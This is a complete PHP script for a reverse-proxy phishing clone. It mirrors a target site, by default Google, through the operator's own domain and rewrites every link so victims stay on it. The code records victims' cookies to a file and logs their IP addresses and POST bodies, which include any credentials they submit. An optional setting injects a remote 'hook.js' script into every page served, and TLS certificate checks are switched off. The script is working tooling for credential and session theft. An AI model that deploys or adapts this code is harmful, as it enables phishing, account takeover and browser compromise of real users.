<?php
	error_reporting(-1);
	session_start();
	ob_start();

	// Config settings
	// URL to redirect to
	$target = "https://www.google.com"; // Location to save captured cookies
	$cookieFile = '/tmp/cookieFile-' . session_id(); // Location to store URL->token mappings
	$mapFile = '/tmp/mapFile.csv'; // Location to store host mapping
	$logFile = '/tmp/logFile.csv'; // Location to store request data
	
	// Set to TRUE to inject code
	$inject = FALSE;
	$evilCode = "http://127.0.0.1/hook.js";
	
	// Send fake User-Agent?
	$sendUA = TRUE;

	function randToken() {
		return sprintf('%06X', mt_rand(0, 0xFFFFFF));
	}

	function checkHostMap($oldHost) {
		global $hostMap, $myDomain;
		$parsedHost = parse_url($oldHost);
		if (array_key_exists($oldHost, $hostMap)) {
			// Have we already seen this host?
			$uniqValue = $hostMap[$oldHost];
			$newHost = $myDomain . "/" . $uniqValue;
		} elseif (array_key_exists('host', $parsedHost) && $parsedHost['host'] !== $_SERVER['HTTP_HOST']) {
			// If not and it's not us, add a new entry
			while (1) {
				$uniqValue = randToken();
				if (!in_array($uniqValue, $hostMap, true)) {
					break;
				}
			}
			$hostMap[$oldHost] = $uniqValue;
			$newHost = $myDomain . "/" . $uniqValue;
		} else {
			// Otherwise return localhost
			$newHost = $myDomain;
		}
		return $newHost;
	}
	
	function injectCode($output) {
		global $evilCode;
		$DOM = new DOMDocument;
		if ($DOM->loadHTML($output)) {
			$head = $DOM->getElementsByTagName('head')->item(0);
			if ($head) {
				$script = $DOM->createElement('script');
				$script->setAttribute('src', $evilCode);
				$head->appendChild($script);
			}
			$output = $DOM->saveHTML();
		}
		return $output;
	}

	function rewriteURLs($output) {
		global $url, $hostMap, $myDomain, $evilCode;
		$DOM = new DOMDocument;
		if ($DOM->loadHTML($output)) {
			// Extract scheme and host from current requested URL
			$parsedReqUrl = parse_url($url);
			$currentHost = $parsedReqUrl['scheme'] . "://" . $parsedReqUrl['host'];

			$attribs = array("src", "href", "action", 'content');
			$elements = $DOM->getElementsByTagName('*');

			foreach ($elements as $element) {
				foreach ($attribs as $attrib) {
					$srcNode = $element->attributes->getNamedItem($attrib);
					if ($srcNode) {
						$oldSrc = $element->attributes->getNamedItem($attrib)->value;
						// If we're dealing with Meta.content, extract URL
						// Fix this to find redirect attrib then do regex
						$tagName = $element->nodeName;
						if (strcasecmp($tagName, "meta") == 0 and preg_match("/(?<=url='|\")[^'|\"]*/i", $oldSrc, $extractedURL)) {
							$urlString = $extractedURL[0];
						}
						else {
							$urlString = $oldSrc;
						}
						
						// Copy $urlString to modify
						$modURL = $urlString;
						
						// Don't modify evilCode
						if ($modURL !== $evilCode) {
							$parsedSrc = parse_url($modURL);
							// First rewrite relative links
							if (!array_key_exists('host', $parsedSrc)) {
								// Standard relative URL
								if (preg_match("/^\//i", $modURL)) {
									$modURL = $currentHost . $modURL;
								} else {
									$modURL = $currentHost . "/" . $modURL;
								}
							} else if (!array_key_exists('scheme', $parsedSrc)) {
								// Protocol relative
								if (preg_match("/^\/\//i", $modURL)) {
									$modURL = parse_url($currentHost)['scheme'] . ":" . $urlString;
								}
							}
							
							// Then rewrite absolute URLs
							$parsedSrc = parse_url($modURL);
							if (array_key_exists('host', $parsedSrc)) {
								// Don't rewrite if it's us
								if ($parsedSrc['host'] !== $_SERVER['HTTP_HOST']) {
									if (array_key_exists('scheme', $parsedSrc)) {
										$oldHost = $parsedSrc['scheme'] . "://" . $parsedSrc['host'];
									} else {
										$oldHost = $parsedSrc['host'];
									}
									$mappedHost = checkHostMap($oldHost);
									$newURL = str_replace($oldHost, $mappedHost, $modURL);
									$newSrc = str_replace($urlString, $newURL, $oldSrc);
									$element->setAttribute($attrib, $newSrc);
								}
							}
						}
					}
				}
			}
			$output = $DOM->saveHTML();
		}
		return $output;
	}

	// Read current url->map data
	$hostMap = array();
	if ($fMap = fopen($mapFile, "r+")) {
		while (($data = fgetcsv($fMap)) !== FALSE) {
			$hostMap[$data[0]] = $data[1];
		}
	}
	fclose($fMap);

	// Does the URL contain a token?
	preg_match('/(?<=^\/)[a-zA-Z0-9]{6}/', $_SERVER['REQUEST_URI'], $uriToken);
	if (!empty($uriToken)) {
		$uriToken = $uriToken[0];
		// Do we already have a URL associated with this token?
		if (in_array($uriToken, $hostMap, true)) {
			$host = array_search($uriToken, $hostMap);
			$path = substr($_SERVER['REQUEST_URI'], 7);
			$url = $host . $path;
		} else {
			$url = $target . $_SERVER['REQUEST_URI'];
		}
	} else {
		// If not, return the base URL
		$url = $target . $_SERVER['REQUEST_URI'];
	}
	
	// Is our hostname in request parameter?
	if (array_key_exists('QUERY_STRING', $_SERVER)) {
		parse_str($_SERVER['QUERY_STRING'], $parsedQuery);
		$queryData = array();
		foreach($parsedQuery as $key => $value) {
			$myHost = $_SERVER['HTTP_HOST'];
			preg_match('/(https?:\/\/)(.*)/i', $target, $setTarget);
			$targetHost = $setTarget[2];
			if (strstr($value, $myHost)) {
				$regex1 = '/('. $_SERVER['HTTP_HOST'] . ')(\/)(' . '[a-zA-Z0-9]{6})/';
				if (preg_match($regex1, $value, $matches)) {
					// Does it appear to contain a token?
					$uriHostAndToken = $matches[0];
					$uriHost = $matches[1];
					$uriToken = $matches[3];
					if (in_array($uriToken, $hostMap, true)) {
						// Do we have a mapping for this token?
						preg_match('/(https?:\/\/)(.*)/', array_search($uriToken, $hostMap), $mappedHost);
						$value = str_replace($uriHostAndToken, $mappedHost[2], $value);
					}
					else {
						// If no mapping found our regex may have failed, replace host with current target
						$value = str_replace($_SERVER['HTTP_HOST'], $setTarget[2], $value);
					}
				} else {
					// If not, just replace host with current target
					$value = str_replace($_SERVER['HTTP_HOST'], $setTarget[2], $value);
				}
			}
			$queryData[$key] = $value;
			
		}
		$queryString = http_build_query($queryData);
		$url = str_replace($_SERVER['QUERY_STRING'], $queryString, $url);
	}

	// Is this an SSL request?
	if (array_key_exists('HTTPS', $_SERVER) && $_SERVER["HTTPS"] === "on") {
		$myDomain = 'https://' . $_SERVER['HTTP_HOST'];
	} else {
		$myDomain = 'http://' . $_SERVER['HTTP_HOST'];
	}

	$ch = curl_init();
	// Set content type
	if (array_key_exists('CONTENT_TYPE', $_SERVER)) {
		$contentType = $_SERVER['CONTENT_TYPE'];
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: " . $contentType));
	}

	// Handle POST data
	if (array_key_exists('REQUEST_METHOD', $_SERVER) && $_SERVER['REQUEST_METHOD'] === "POST") {
		curl_setopt($ch, CURLOPT_POST, true);
		// Set content-type
		if (array_key_exists('CONTENT_TYPE', $_SERVER) && strpos($_SERVER['CONTENT_TYPE'], "multipart/form-data") === 0) {
			$fileName = $_FILES['upfile']['name'];
			$postData = file_get_contents($_FILES['upfile']['tmp_name']);
		} else {
			$postData = file_get_contents("php://input");
		}
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	}
	else {
		$postData = '<no-data>';
	}
	
	// Set referrer
	if (array_key_exists('HTTP_REFERER', $_SERVER)) {
		curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
	}
	// Set User-Agent
	if ($sendUA) {
		if (array_key_exists('HTTP_USER_AGENT', $_SERVER)) {
			//curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
			curl_setopt($ch, CURLOPT_USERAGENT, "proxyClone");
			
		}
	}
	
	// Do we have any cookies?
	// These should only be client side cookies - hackish fix
	if (array_key_exists('HTTP_COOKIE', $_SERVER)) {
		$incomingCookies = explode(';', $_SERVER['HTTP_COOKIE']);
		foreach ($incomingCookies as $cookie) {
			$extractedCookie = explode('=', $cookie, 2);
			if ($extractedCookie[0] != "PHPSESSID" and $extractedCookie[1] != session_id()) {
				$cookieEntry = ".google.com	TRUE	/	FALSE	0	" . $extractedCookie[0] . "\t" . $extractedCookie[1] . PHP_EOL;
				file_put_contents($cookieFile, $cookieEntry, FILE_APPEND | LOCK_EX,null);
			}
		}
	}

	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLINFO_HEADER_OUT, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookieFile);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
	$curlResponse = curl_exec($ch);

	// Check that a connection was made
	if (curl_error($ch)) {
		print curl_error($ch);
	} else {
		// Clean duplicate responses
		$curlResponse = str_replace("HTTP/1.1 100 Continue\r\n\r\n", "", $curlResponse);
		$ar = explode("\r\n\r\n", $curlResponse, 2);
		$header = $ar[0];
		$body = $ar[1];

		// Repeat headers for client response
		$arHeader = explode(chr(10), $header);
		foreach ($arHeader as $key => $value) {
			if (!preg_match("/^Transfer-Encoding/", $value) && !preg_match("/^Set-Cookie/", $value)) {
				$value = str_replace($target, $myDomain, $value);
				if (preg_match("/^Location/", $value)) {
					$parsedSrc = parse_url(substr($value, 10));
					$oldHost = $parsedSrc['scheme'] . "://" . $parsedSrc['host'];
					$newHost = checkHostMap($oldHost);
					$value = str_replace($oldHost, $newHost, $value);
				}
				if (preg_match("/^Content-Type/", $value)) {
					if (preg_match("/text\/html/i", $value)) {
						if ($inject) {
							$body = injectCode($body);
						}
						$body = rewriteURLs($body);
					}
				}
				header(trim($value));
			}
		}
		$results = $body;
	}

	if (!empty($results)) {
		print $results;
	}

	// Update url mapping file
	$fMap = fopen($mapFile, 'w');
	foreach ($hostMap as $key => $value) {
		$row = explode(',', $key . "," . $value);
		fputcsv($fMap, $row);
	}
	fclose($fMap);
	
	// Log request data
	$logging = fopen($logFile, 'a');
	$info = curl_getinfo($ch);
	$row = array($_SERVER['REMOTE_ADDR'], session_id(), $info['url'], $postData);
	fputcsv($logging, $row);
	fclose($logging);
	
	curl_close($ch);
?>
